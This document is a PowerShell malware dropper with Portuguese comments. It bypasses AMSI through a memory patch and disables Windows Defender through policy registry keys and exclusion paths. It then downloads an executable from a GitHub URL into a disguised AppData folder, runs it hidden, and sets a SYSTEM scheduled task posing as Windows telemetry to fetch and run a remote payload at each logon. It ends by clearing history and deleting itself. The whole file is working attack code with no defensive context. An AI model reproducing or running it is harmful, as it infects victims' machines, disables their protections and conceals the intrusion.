# --- CONFIGURAÇÕES GITHUB ---
$Url_Malware = "https://github.com/thzinxa6/Instalation/raw/refs/heads/main/win_sys_manager.exe"
$Url_Payload = "https://raw.githubusercontent.com/thzinxa6/Instalation/refs/heads/main/payload.ps1"

$Dir = "$env:APPDATA\Local\Microsoft\Windows\SystemCache"
$FileName = "win_sys_manager.exe"
$Path = "$Dir\$FileName"

# 1. AMSI BYPASS (PATCH EM MEMÓRIA)
$A = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$B = $A.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$C = $B.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt64($C, 0x0) 2>$null

# 2. BLOQUEIO ADMINISTRATIVO DO DEFENDER (GPO & REGISTRY)
# Isso faz aparecer a mensagem "Gerenciado pela sua organização"
try {
    $GPOPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (!(Test-Path $GPOPath)) { New-Item -Path $GPOPath -Force | Out-Null }
    
    # Desativa o motor principal e o monitoramento em tempo real via Política
    Set-ItemProperty -Path $GPOPath -Name "DisableAntiSpyware" -Value 1
    Set-ItemProperty -Path "$GPOPath\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1
    
    # Desativa via comando tradicional para garantir o estado atual
    Set-MpPreference -DisableRealtimeMonitoring $true -SubmitSamplesConsent 2 -MAPSReporting 0 -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $Dir, $env:TEMP -ErrorAction SilentlyContinue
} catch {}

# 3. DOWNLOAD E INSTALAÇÃO
if (!(Test-Path $Dir)) { New-Item -Path $Dir -ItemType Directory -Force | Out-Null }
if (!(Test-Path $Path)) {
    try {
        Invoke-WebRequest -Uri $Url_Malware -OutFile $Path -UseBasicParsing -ErrorAction SilentlyContinue
        Unblock-File -Path $Path -ErrorAction SilentlyContinue
    } catch { exit }
}

# 4. EXECUÇÃO OCULTA
if (Test-Path $Path) {
    $ProcName = [System.IO.Path]::GetFileNameWithoutExtension($FileName)
    if (!(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath $Path -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}

# 5. PERSISTÊNCIA SILENCIOSA (TASK SCHEDULER)
# Não aparece no "Inicializar" do Gerenciador de Tarefas
$TName = "WindowsTelemetryUpdates"
$Cmd = "powershell -nop -w hidden -c `"iwr -useb $Url_Payload | iex`""
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $Cmd"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null

# 6. LIMPEZA
Clear-History
if (Test-Path $PSCommandPath) {
    Remove-Item -Path "$PSCommandPath" -Force -ErrorAction SilentlyContinue
}
